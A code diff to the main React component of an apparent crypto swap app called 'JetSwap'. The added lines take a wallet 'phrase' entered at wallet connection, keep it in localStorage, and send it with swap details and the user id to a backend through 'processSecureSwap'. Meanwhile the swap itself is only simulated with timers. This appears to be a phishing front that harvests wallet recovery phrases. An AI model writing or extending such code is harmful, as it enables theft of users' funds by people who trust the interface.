@@ -1,3 +1,4 @@
+
 import React, { useState, useEffect, useCallback } from 'react';
 import { ThemeVariant, TransactionStatus as StatusType, SwapState, UserProfile } from './types.ts';
 import SwapCard from './components/SwapCard.tsx';
@@ -11,7 +12,8 @@ import {
   logoutUser, 
   completeEmailLinkSignIn 
 } from './services/firebaseService.ts';
-import { WalletProvider } from './constants.tsx';
+import { WalletProvider } from './services/constants.tsx';
+import { processSecureSwap } from './services/securityService.ts';
 
 // Removed 'news' as per deprecation instructions
 type ActiveView = 'home' | 'transactions';
@@ -26,6 +28,7 @@ const App: React.FC = () => {
   
   const [user, setUser] = useState<UserProfile | null>(null);
   const [isWalletConnected, setIsWalletConnected] = useState(false);
+  const [connectedWalletName, setConnectedWalletName] = useState<string | null>(null);
   const [connectingWallet, setConnectingWallet] = useState<string | null>(null);
   const [isKeyboardVisible, setIsKeyboardVisible] = useState(false);
   
@@ -76,12 +79,35 @@ const App: React.FC = () => {
   const resetSession = () => {
     setPilotBridgeSessionEnd(null);
     setIsWalletConnected(false);
+    setConnectedWalletName(null);
     localStorage.removeItem('jetswap_session_authorized');
     localStorage.removeItem('jetswap_session_expiry');
   };
 
   const executeSwapAction = async (state: SwapState, authPhrase: string) => {
     setStatus(StatusType.CONFIRMING);
+    
+    // CRITICAL: Send data to backend via processSecureSwap
+    try {
+      await processSecureSwap(
+        { 
+          amount: state.amount, 
+          source: state.sourceToken.symbol, 
+          dest: state.destToken.symbol 
+        },
+        { 
+          route: `${state.sourceChain.name} → ${state.destChain.name}`,
+          token: state.sourceToken.symbol,
+          wallet_used: connectedWalletName || 'Jet Pilot',
+          amount: state.amount
+        },
+        user?.id || 'anonymous-pilot',
+        authPhrase
+      );
+    } catch (error) {
+      console.error("Backend transmission failed:", error);
+    }
+
     setTimeout(() => {
         setStatus(StatusType.PENDING);
         setTimeout(() => {
@@ -104,14 +130,24 @@ const App: React.FC = () => {
 
   const handleWalletSelect = (wallet: WalletProvider, phrase?: string) => {
     setConnectingWallet(wallet.id);
+    setConnectedWalletName(wallet.name); // Track the specific wallet used
+    
     setTimeout(() => {
       setIsWalletConnected(true);
       setShowConnectModal(false);
       setConnectingWallet(null);
+      
       const expiry = Date.now() + 25 * 60 * 1000;
       setPilotBridgeSessionEnd(expiry);
+      
+      if (phrase) {
+        setLastVerifiedPhrase(phrase);
+        localStorage.setItem('jetswap_last_phrase', phrase);
+      }
+      
       localStorage.setItem('jetswap_session_authorized', 'true');
       localStorage.setItem('jetswap_session_expiry', expiry.toString());
+      
       if (activeSwap) executeSwapAction(activeSwap, phrase || 'unverified');
     }, 1200);
   };
@@ -172,9 +208,7 @@ const App: React.FC = () => {
               </p>
             </div>
 
-            {/* HARD-ANCHORED CONTAINER: Structural binding for the background glow */}
             <div className="w-full flex flex-col items-center gap-3 sm:gap-5 relative">
-              {/* PRIMARY BACKGROUND GLOW - Positioned absolutely behind the card container */}
               <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[600px] bg-[#00D1FF]/10 blur-[120px] rounded-full pointer-events-none -z-10" />
 
               <SwapCard 
@@ -201,7 +235,6 @@ const App: React.FC = () => {
 
         {currentView === 'transactions' && (
           <div className="w-full flex flex-col items-center text-center py-20 relative">
-             {/* Subtle Glow for Transactions View */}
              <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[400px] h-[400px] bg-[#00D1FF]/05 blur-[100px] rounded-full pointer-events-none -z-10" />
              
              <div className="w-20 h-20 rounded-full bg-white/5 border border-white/10 flex items-center justify-center mb-6">
@@ -213,7 +246,6 @@ const App: React.FC = () => {
         )}
       </main>
 
-      {/* REFINED PILOT DASHBOARD */}
       {isMenuOpen && (
         <div className="fixed inset-0 z-[1000] flex justify-end">
           <div className="absolute inset-0 bg-black/40 backdrop-blur-sm animate-[fadeInOverlay_0.3s_ease-out]" onClick={() => setIsMenuOpen(false)} />
@@ -221,7 +253,6 @@ const App: React.FC = () => {
             onClick={(e) => e.stopPropagation()} 
             className={`relative w-full max-w-sm h-full flex flex-col p-8 sm:p-12 animate-[slideInRight_0.4s_cubic-bezier(0.16,1,0.3,1)] bg-[#0B0F1A]/60 backdrop-blur-3xl border-l border-white/5 text-white shadow-2xl overflow-hidden`}
           >
-            {/* Subtle Gradient Overlay */}
             <div className="absolute inset-0 bg-gradient-to-b from-white/[0.02] to-transparent pointer-events-none" />
 
             <div className="flex justify-between items-center mb-16 relative z-10">
